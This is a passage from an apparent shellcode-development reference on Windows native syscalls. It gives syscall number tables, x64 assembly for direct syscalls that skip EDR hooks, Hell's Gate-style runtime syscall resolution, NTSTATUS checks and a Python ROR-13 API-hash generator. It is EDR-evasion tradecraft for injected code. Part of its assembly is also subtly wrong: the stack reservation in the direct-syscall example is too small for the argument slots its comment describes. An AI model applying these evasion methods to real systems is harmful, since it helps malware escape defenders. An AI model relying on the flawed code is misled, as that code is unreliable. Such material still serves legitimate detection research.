mov  eax, <syscall_number>
syscall
ret
```

The `mov r10, rcx` is required because the `syscall` instruction overwrites `RCX` with the return address; the kernel reads the first argument from `R10` instead.

### Syscall Number Derivation

Syscall numbers are assigned during the kernel build process based on the alphabetical sort order of `Nt*` functions in the System Service Descriptor Table (SSDT). When Microsoft adds a new `Nt*` function or removes one, all subsequent numbers shift. This is why Windows 10 version 1903 may have different numbers than 1607 even though both are "Windows 10".

```
SSDT slot assignment (simplified):
    NtAcceptConnectPort    → 0x00
    NtAccessCheck          → 0x01
    NtAccessCheckAndAuditAlarm → 0x02  (stable because 'A' comes early)
    NtAccessCheckByType    → 0x03
    ...
    NtAllocateVirtualMemory → shifts between major versions
```

Functions with names early in the alphabet (like `NtAccessCheckAndAuditAlarm`) have stable low syscall numbers. Functions added in later Windows versions (like `NtCreateThreadEx`, added in Vista) have higher, less stable numbers.

---

## Syscall Number Tables

### Key Functions Across Windows x86 Versions

| Function | XP SP2 | XP SP3 | Vista | Win7 | Win8.1 | Win10 1607 | Win10 1903+ |
|---|---|---|---|---|---|---|---|
| `NtAccessCheckAndAuditAlarm` | `0x02` | `0x02` | `0x02` | `0x02` | `0x02` | `0x02` | `0x02` |
| `NtAllocateVirtualMemory` | `0x11` | `0x11` | `0x13` | `0x15` | `0x18` | `0x18` | `0x18` |
| `NtCreateThreadEx` | N/A | N/A | `0xAF` | `0xB0` | `0xBD` | `0xBD` | `0xC1` |
| `NtProtectVirtualMemory` | `0x4D` | `0x4D` | `0x4F` | `0x4D` | `0x50` | `0x50` | `0x50` |
| `NtQueryInformationProcess` | `0x9A` | `0x9A` | `0x22` | `0x23` | `0x28` | `0x19` | `0x19` |
| `NtReadVirtualMemory` | `0xBA` | `0xBA` | `0x2C` | `0x2D` | `0x3F` | `0x3F` | `0x3F` |
| `NtWriteVirtualMemory` | `0x115` | `0x115` | `0x37` | `0x3A` | `0x3E` | `0x3A` | `0x3A` |
| `NtDisplayString` | `0xAD` | `0xAD` | `0xB5` | `0xB2` | varies | varies | varies |

> **Note:** These values are for x86 (32-bit) user-mode syscalls on the named version. x64 syscall numbers differ entirely. WoW64 (32-bit process on 64-bit OS) thunks through an additional layer (`wow64.dll`) and uses the 32-bit SSDT on the 64-bit kernel.

### WoW64 Implications

In a 32-bit process running under WoW64 (64-bit OS), `ntdll.dll` in the process is the 32-bit version, but `syscall` instructions are intercepted by `wow64.dll` and translated. This means:
- 32-bit syscall stubs still work (the WoW64 layer translates transparently).
- Syscall numbers are for the 32-bit SSDT, not the native 64-bit SSDT.
- Direct syscall injection that bypasses ntdll stubs must use the 32-bit numbers when running as WoW64.
- "Heaven's Gate" (`far jmp 0x33:target`) is used to escape WoW64 and execute native 64-bit code.

---

## Why Shellcode Targets kernel32 First

Given that ntdll is lower-level, why does shellcode always start with a `kernel32.dll` PEB walk rather than ntdll?

### 1. PEB Module Order

The `InMemoryOrderModuleList` in the PEB Ldr data structure orders entries in load order:
```
[0] = Main executable (e.g., notepad.exe)
[1] = ntdll.dll
[2] = kernel32.dll
[3] = kernelbase.dll (Vista+)
[4] = ... other imports
```

A two-dereference skip finds kernel32 at index 2 reliably. To find ntdll, shellcode dereferences index 1 — only *one* dereference. Some shellcode actually resolves ntdll first, then kernel32. It depends on what the shellcode needs.

### 2. Syscall Number Instability

As shown in the syscall tables above, `NtAllocateVirtualMemory`'s number changes between XP (`0x11`), Vista (`0x13`), and 7 (`0x15`). Shellcode that hardcodes `0x11` fails silently on Vista and later. `VirtualAlloc` via kernel32 always works — the Win32 layer handles version differences.

### 3. Simpler API Surface

Win32 APIs (`VirtualAlloc`, `CreateThread`, `CreateProcessA`) handle edge cases, error translation, and parameter validation that native APIs leave to the caller. For shellcode authors who need reliability over minimalism, kernel32 is easier.

### 4. EDR/AV Hook Avoidance as a Counter-Reason

The scenario where shellcode *prefers* ntdll or direct syscalls:
- EDR products (CrowdStrike, SentinelOne, Carbon Black) instrument kernel32 and ntdll function entry points via DLL injection and inline hooks.
- A call to `VirtualAlloc` may be intercepted at the kernel32 stub, at the kernelbase.dll redirect, or at the ntdll stub.
- Direct syscall invocation (no ntdll call at all) bypasses all userland hooks, because the hook only exists in the user-mode DLL, not in the kernel.

---

## Direct Syscall Invocation

### The Technique

Instead of calling the ntdll stub (which EDR may have hooked), shellcode can execute the `syscall` (x64) or `sysenter` (x86) instruction directly within the shellcode itself:

```nasm
; x64 direct syscall: NtAllocateVirtualMemory
; Syscall number for target OS loaded into EAX at runtime (via version check or leaked value)

; Build parameters in registers (fastcall):
; RCX = ProcessHandle = -1
; RDX = &BaseAddress
; R8  = ZeroBits = 0
; R9  = &RegionSize
; Stack args: AllocationType, Protect

xor   rcx, rcx
dec   rcx               ; RCX = -1 (current process)
lea   rdx, [base_var]   ; RDX = &BaseAddress
xor   r8, r8            ; ZeroBits = 0
lea   r9, [size_var]    ; R9 = &RegionSize
sub   rsp, 0x28         ; shadow space + 2 stack args (0x10) + alignment
mov   dword [rsp+0x20], 0x3000  ; AllocationType
mov   dword [rsp+0x28], 0x40    ; Protect

mov   r10, rcx          ; r10 = first arg (kernel convention)
mov   eax, 0x18         ; syscall number for NtAllocateVirtualMemory (Win10)
syscall                 ; transition to kernel

add   rsp, 0x28
```

### Why This Evades EDR Hooks

EDR hooks are function-level patches in user-mode DLLs:
```
NtAllocateVirtualMemory in ntdll.dll:
  Original bytes:    mov r10, rcx ; mov eax, 0x18 ; syscall
  Hooked bytes:      jmp [edr_hook_trampoline]   ← EDR overwrites entry
```

Direct syscall completely skips ntdll:
```
Shellcode → syscall instruction → kernel
                     (no ntdll traversal, no hook)
```

### Syscall Number Resolution at Runtime

Because syscall numbers change per OS version, production shellcode must determine them at runtime rather than hardcoding. Techniques:

1. **Parse ntdll export + stub:** Resolve `NtAllocateVirtualMemory` via PEB walk, read the `mov eax, N` instruction from the stub bytes to extract `N`. This still touches ntdll but only reads, doesn't call through it.

2. **Version check:** Read `KUSER_SHARED_DATA.NtBuildNumber` at `0x7FFE0000 + 0x0260` (fixed address, kernel-mapped read-only). Map build number to syscall number table in shellcode.

3. **Halo's Gate / Hell's Gate:** If the ntdll stub entry is hooked (first bytes patched to `jmp`), scan neighboring stubs to find an intact one with a sequential syscall number, then derive the target number by offset.

```nasm
; Read NtBuildNumber from KUSER_SHARED_DATA (x86)
mov  eax, dword [0x7FFE0000 + 0x0260]   ; NtBuildNumber
; e.g., 0x00003B01 = build 15105... match to version table in shellcode
```

---

## NTAPI Calling Convention

### User-Mode (Same as Win32 __stdcall)

All `Nt*` and `Rtl*` functions in user-mode ntdll use `__stdcall`:
- Arguments pushed right-to-left.
- Callee cleans the stack (`RETN N`).
- Return value in `EAX` (x86) or `RAX` (x64).
- `NTSTATUS` return type: `0x00000000` = `STATUS_SUCCESS`; negative values indicate errors; `0xC0000005` = `STATUS_ACCESS_VIOLATION`.

### Kernel-Mode (Different ABI for kernel-internal calls)

When code runs inside the kernel (not relevant for user-mode shellcode, but included for completeness):
- x86: `__stdcall` for most `Nt*` and `Ex*` routines; `__fastcall` for some internal helpers.
- x64: Always Microsoft x64 ABI (`__fastcall`).
- IRQLs (Interrupt Request Levels) affect which functions can be called at what context — not applicable to shellcode.

### NTSTATUS Error Codes Relevant to Shellcode

| Code | Value | Meaning |
|---|---|---|
| `STATUS_SUCCESS` | `0x00000000` | Operation succeeded |
| `STATUS_ACCESS_VIOLATION` | `0xC0000005` | Invalid memory access (used by egghunter) |
| `STATUS_INVALID_HANDLE` | `0xC0000008` | Invalid handle passed |
| `STATUS_ACCESS_DENIED` | `0xC0000022` | Insufficient privileges |
| `STATUS_NO_MEMORY` | `0xC0000017` | Allocation failed |
| `STATUS_INVALID_PARAMETER` | `0xC000000D` | Bad argument |
| `STATUS_CONFLICTING_ADDRESSES` | `0xC0000018` | VirtualAlloc address conflict |
| `STATUS_BUFFER_TOO_SMALL` | `0xC0000023` | Output buffer undersized |

```nasm
; Checking NTSTATUS after NtAllocateVirtualMemory
call [NtAllocateVirtualMemory_ptr]
test eax, eax
jnz  allocation_failed  ; any non-zero = failure (STATUS_SUCCESS = 0)
; Alternatively check the sign bit (bit 31) for definitive error:
; js  severe_error    ; negative NTSTATUS = error facility
```

### NtStatus Severity Bits

The high 2 bits of `NTSTATUS` encode severity:
- `00xxxxxx` — Success
- `01xxxxxx` — Informational
- `10xxxxxx` — Warning
- `11xxxxxx` — Error (e.g., `0xC0000005`: `11` = error)

```nasm
; Check for any error (bit 31 set):
shr  eax, 30            ; shift severity bits to low positions
cmp  eax, 3             ; 3 = 0b11 = error severity
je   handle_error
```

---

## ROR-13 Hash Quick Reference

### ntdll Exports

| Function | Hash (hex) | Null bytes? | Notable bad chars |
|---|---|---|---|
| `NtAllocateVirtualMemory` | `0x938B4BCF` | No | `\xCF` high byte |
| `NtProtectVirtualMemory` | `0x4E6B8594` | No | `\x94` high byte |
| `LdrLoadDll` | `0x185C8CA7` | No | `\xA7` high byte |
| `RtlAllocateHeap` | (compute) | — | — |
| `NtQueryInformationProcess` | (compute) | — | — |

### Computing ntdll Hashes

```python
def ror13(name: str) -> int:
    """Compute ROR-13 hash for a function name (null-terminated)."""
    h = 0
    for c in name + '\x00':
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
        h = (h + ord(c)) & 0xFFFFFFFF
    return h

functions = [
    "NtAllocateVirtualMemory",
    "NtProtectVirtualMemory",
    "NtWriteVirtualMemory",
    "NtCreateThreadEx",
    "NtQueryInformationProcess",
    "RtlAllocateHeap",
    "RtlCopyMemory",
    "RtlZeroMemory",
    "LdrLoadDll",
    "LdrGetProcedureAddress",
]

for fn in functions:
    h = ror13(fn)
    print(f"{fn:40s} 0x{h:08X}  null={'yes' if h & 0xFF == 0 or (h >> 8) & 0xFF == 0 or (h >> 16) & 0xFF == 0 or (h >> 24) & 0xFF == 0 else 'no'}")
```

### Module Hash for "ntdll.dll"

The PEB walk hashes both the module name and its exports. When searching for the ntdll base in the PEB module list:

```python
# Module name hash (kernel32.dll PEB walk also hashes module names)
# "ntdll.dll" case-insensitive (compare against uppercased name in PEB)
print(hex(ror13("ntdll.dll")))     # depends on implementation (case matters)
print(hex(ror13("NTDLL.DLL")))     # upper-case version used in some implementations
```

Different shellcode implementations handle case normalization differently. The skape-style PEB walker uppercases each character before hashing; others hash the name as stored in the PEB (mixed case). Ensure your resolver is consistent.

---

## Further Reading

- skape, *"Safely Searching Process Virtual Address Space"* (2004) — original NtAccessCheckAndAuditAlarm egghunter paper: https://web.archive.org/web/20190124160200/http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
- ReactOS source code — ntdll implementation reference: https://github.com/reactos/reactos/tree/master/dll/ntdll
- j00ru's Windows syscall tables: https://github.com/j00ru/windows-syscalls
- Windows Internals (Yosifovich et al.), Part 1, Chapter 8: System Mechanisms (syscall dispatch)
- Hell's Gate technique paper: https://github.com/am0nsec/HellsGate
- Syswhispers2 (syscall stub generator): https://github.com/jthuraisamy/SysWhispers2
- Corelan Team: VirtualProtect ROP chain tutorials: https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubik-s-cube/

---

*Last updated: 2026-05-17 | Applies to: Windows XP through Windows 11, x86 (32-bit) primary, x64 notes where applicable*
